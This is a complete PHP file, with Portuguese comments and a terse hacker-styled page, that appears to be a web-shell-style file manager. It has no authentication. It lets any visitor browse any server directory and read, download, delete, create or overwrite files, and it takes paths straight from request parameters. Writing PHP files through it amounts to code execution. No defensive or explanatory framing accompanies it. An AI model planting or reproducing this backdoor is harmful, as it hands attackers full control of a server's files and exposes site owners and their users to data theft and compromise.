<?php
// Configurações e ações PHP no topo para execução imediata
$dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
$path = realpath($dir);
if (!$path || !is_dir($path)) die("Caminho inválido.");

// Ações de arquivo
if (isset($_GET['download'])) {
    $file = "$path/" . $_GET['download'];
    if (file_exists($file)) { header('Content-Type: application/octet-stream'); header('Content-Disposition: attachment; filename="'.basename($file).'"'); readfile($file); exit; } else { die('Arquivo não encontrado.'); }
}
if (isset($_GET['delete'])) {
    $file = "$path/" . $_GET['delete'];
    if (file_exists($file)) { unlink($file); header("Location: ?dir=$path"); exit; } else { die("Erro: Arquivo não encontrado."); }
}
if (isset($_POST['newfile'])) {
    file_put_contents("$path/" . $_POST['newfile'], $_POST['content'] ?? '');
    header("Location: ?dir=$path"); exit;
}
if (isset($_POST['editfile'])) {
    file_put_contents("$path/" . $_POST['editfile'], $_POST['content']);
    header("Location: ?dir=$path"); exit;
}
?>
<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>WM</title><style>body{font-family:monospace;background:#222;color:#0F0;}a{color:#0FF;}button{background:#444;color:#FFF;border:1px solid #777;}textarea,input[type=text]{background:#333;color:#0F0;border:1px solid #555;}form{margin-bottom:10px;}</style></head><body>
<h2>Dir: <?php echo htmlspecialchars($path); ?></h2><ul>
<?php
foreach (scandir($path) as $item) {
    if ($item === '.' || $item === '..') {
        if ($item === '..') echo '<li><a href="?dir=' . urlencode(dirname($path)) . '">../</a></li>';
        continue;
    }
    $itemPath = "$path/$item";
    echo '<li>';
    if (is_dir($itemPath)) {
        echo "<a href='?dir=" . urlencode($itemPath) . "'>$item/</a>";
    } else {
        echo "<a href='?dir=" . urlencode($path) . "&edit=" . urlencode($item) . "'>$item</a> ";
        echo "<form method='GET' style='display:inline;'><input type='hidden' name='dir' value='".htmlspecialchars($path)."'><input type='hidden' name='download' value='".htmlspecialchars($item)."'><button type='submit'>D</button></form> ";
        echo "<form method='GET' style='display:inline;' onsubmit=\"return confirm('Del $item?');\"><input type='hidden' name='dir' value='".htmlspecialchars($path)."'><input type='hidden' name='delete' value='".htmlspecialchars($item)."'><button type='submit'>X</button></form>";
    }
    echo '</li>';
}
?>
</ul>
<?php if (isset($_GET['edit'])) { $file = "$path/" . $_GET['edit']; if (file_exists($file)) { echo "<h3>Edit: ".htmlspecialchars($_GET['edit'])."</h3><form method='POST'><textarea name='content' cols='80' rows='20'>".htmlspecialchars(file_get_contents($file))."</textarea><br><input type='hidden' name='editfile' value='".htmlspecialchars($_GET['edit'])."'><input type='submit' value='Save'></form>"; } else { echo "<p>File not found.</p>"; } } ?>
<h3>New File</h3><form method="POST"><input name="newfile" placeholder="Name"><br><textarea name="content" cols="80" rows="10"></textarea><br><input type="submit" value="Create"></form>
</body></html>
